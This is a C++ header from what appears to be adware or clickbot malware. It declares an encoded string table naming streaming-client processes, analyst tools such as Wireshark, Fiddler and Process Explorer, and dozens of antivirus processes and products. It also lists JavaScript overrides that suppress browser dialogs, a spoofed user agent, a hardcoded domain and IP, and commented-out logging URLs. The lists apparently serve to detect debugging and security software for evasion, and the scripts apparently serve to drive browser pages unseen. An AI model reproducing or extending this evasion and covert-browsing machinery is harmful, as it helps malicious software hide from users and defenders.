#pragma once

#include <string>
using namespace std;

enum GStringIndex
{
	PROCESS_Monitor_exe = 0,		// monitor.exe
	PROCESS_UpdateMonitor_exe,		// UpdateMonitor.exe
	PROCESS_ppliveva_exe,			// ppliveva.exe
	PROCESS_ppap_exe,				// ppap.exe
	PROCESS_pplive_exe,				// pplive.exe
	PROCESS_ppsap_exe,				// ppsap.exe
	PROCESS_FuckIUT_exe,			// FuckIUT.exe
	PROCESS_PPDataActiver_exe,		// PPDataActiver.exe
	PROCESS_PFSDataActiver_exe,		// PFSDataActiver.exe
	PROCESS_WCScheduler_exe,		// WCScheduler.exe
	PROCESS_szplayer_exe,			// szplayer.exe
	PROCESS_PPLite_exe,				// PPLite.exe
	PROCESS_pptv_scr,				// pptv.scr
	PROCESS_ppgame_exe,				// ppgame.exe
	
	PROCESS_iResea,					// iResea
	PROCESS_PPLive_exe,				// PPLive.exe
	PROCESS_iresea,					// iresea
	PROCESS_PPStream,				// PPStream
	PROCESS_PPSAP,					// PPSAP
	PROCESS_PPSWangLuoDianShi,		// PPS网络电视
	

	DOMAIN_INADDR_NONE,				//INADDR_NONE
	DOMAIN_pp3_g1d_net,				//pp3.g1d.net
	DOMAIN_122_224_73_82,			//122.224.73.82
	
	DEV_Visual_Assist,				//Visual Assist
	DEV_Wireshark,					//Wireshark
	DEV_WinPcap,					//WinPcap
	DEV_Sniffer,					//Sniffer
	DEV_Borland,					//Borland
	DEV_Delphi,						//Delphi
	DEV_HTTP_Analyzer,				//HTTP Analyzer
	DEV_IEWatch,					//IEWatch
	DEV_NetLimiter,					//NetLimiter
	DEV_NetPeeker,					//NetPeeker
	DEV_Socket_Moniter,				//Socket Monitor
	DEV_Visual_Studio,				//Visual Studio
	DEV_Fiddler,					//Fiddler

	DEVP_SPYXX_EXE,					//SPYXX.EXE
	DEVP_NPGUI_EXE,					//NPGUI.exe
	DEVP_NetPeeker_exe,				//NetPeeker.exe
	DEVP_MSDEV_EXE,					//MSDEV.EXE
	DEVP_devenv_exe,				//devenv.exe
	DEVP_procexp_exe,				//procexp.exe
	DEVP_Filemon_exe,				//Filemon.exe
	DEVP_HttpAnalyzer,				//HttpAnalyzer
	DEVP_SOCKMON_EXE,				//SOCKMON.EXE
	DEVP_WINIPMON_EXE,				//WINIPMON.EXE	
	DEVP_Fiddler_exe,				//Fiddler.exe
	DEVP_CPal_exe,					//CPal.exe
	DEVP_ppstream_exe,				//ppstream.exe
	DEVP_ppsap_exe,					//ppsap.exe
	DEVP_PPSGame_exe,				//PPSGame.exe			

	SAFEP_RavCopy_exe,				//RavCopy.exe
	SAFEP_RavTask_exe,				//RavTask.exe
	SAFEP_rsnetsvr_exe,				//rsnetsvr.exe
	SAFEP_RSTray_exe,				//RSTray.exe
	SAFEP_scanfrm_exe,				//scanfrm.exe
	SAFEP_avp_exe,					//avp.exe
	SAFEP_KVMonXP_kxp,				//KVMonXP.kxp
	SAFEP_KVSrvXP_exe,				//KVSrvXP.exe
	SAFEP_360tray_exe,				//360tray.exe
	SAFEP_360Safe_exe,				//360Safe.exe
	SAFEP_360rp_exe,				//360rp.exe
	SAFEP_360sd_exe,				//360sd.exe
	SAFEP_AluSchedulerSvc_exe,		//AluSchedulerSvc.exe
	SAFEP_ccSvcHst_exe,				//ccSvcHst.exe
	SAFEP_symlcsvc_exe,				//symlcsvc.exe
	SAFEP_comHost_exe,				//comHost.exe
	SAFEP_kavstart_exe,				//kavstart.exe
	SAFEP_kavbackreport_exe,		//kavbackreport.exe
	SAFEP_kissvc_exe,				//kissvc.exe
	SAFEP_kav32_exe,				//kav32.exe
	SAFEP_pfw_exe,					//pfw.exe
	SAFEP_McNASvc_exe,				//McNASvc.exe
	SAFEP_McfSrv_exe,				//McfSrv.exe
	SAFEP_McSACore_exe,				//McSACore.exe
	SAFEP_McProxy_exe,				//McProxy.exe
	SAFEP_mcagent_exe,				//mcagent.exe
	SAFEP_mcmscsvc_exe,				//mcmscsvc.exe
	SAFEP_mcshell_exe,				//mcshell.exe
	SAFEP_McSchield_exe,			//McSchield.exe
	SAFEP_mcsysmon_exe,				//mcsysmon.exe
	SAFEP_nod32kui_exe,				//nod32kui.exe
	SAFEP_nod32krn_exe,				//nod32krn.exe

	SAFE_RuiXin,					//瑞星
	SAFE_KaBaSiJi,					//卡巴斯基
	SAFE_JIangMing,					//江民
	SAFE_360AnQuanWeiShi,			//360安全卫士
	SAFE_360ShaDu,					//360杀毒
	SAFE_Norton,					//Norton
	SAFE_Symantec,					//Symantec
	SAFE_JinShanDuBa,				//金山毒霸
	SAFE_JinShanWangBiao,			//金山网镖
	SAFE_TianWangFangHuoQiang,		//天网防火墙
	SAFE_McAfee,					//McAfee
	SAFE_NOD32,						//NOD32
	SAFE_ESET,						//ESET
	SAFE_MumaQingDaoFu,				//木马清道夫
	SAFE_MuMaKeXin,					//木马克星
	SAFE_EYiDAShi,					//恶意大师
	SAFE_WeiDianZhuDongFangYu,		//微点主动防御
	SAFE_ETrust,					//ETrust
	SAFE_AVG,						//AVG

	SCRIPT_1,						//window.alert=function() {}
	SCRIPT_2,						//window.confirm=function() {return true;}
	SCRIPT_3,						//window.prompt=function() {return true;}
	SCRIPT_4,						//window.showModalDialog=function() {return true;}
	SCRIPT_5,						//window.showModelessDialog=function() {return true;}
	SCRIPT_6,						//window.print=function() {}
	SCRIPT_7,						//window.external.AddFavorit=function() {}

	STRING_UserAgent,				//Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6
//	STRING_LogUrl,					//http://up.2nike.org/1.html
//	STRING_LogUrl2,					//http://up.2nike.org/2.html
	
	GSTRING_MAX
};

class GString
{
public:
	string& operator [] (int index);
	void Show();
	GString();
private:
	string	m_string[GSTRING_MAX];
	bool	m_isDecode[GSTRING_MAX];
};

extern GString gs;

#ifdef NEED_LOG
class GStringTest
{
public:
	GStringTest();
	string m_string[GSTRING_MAX];
};
extern GStringTest gst;
#endif




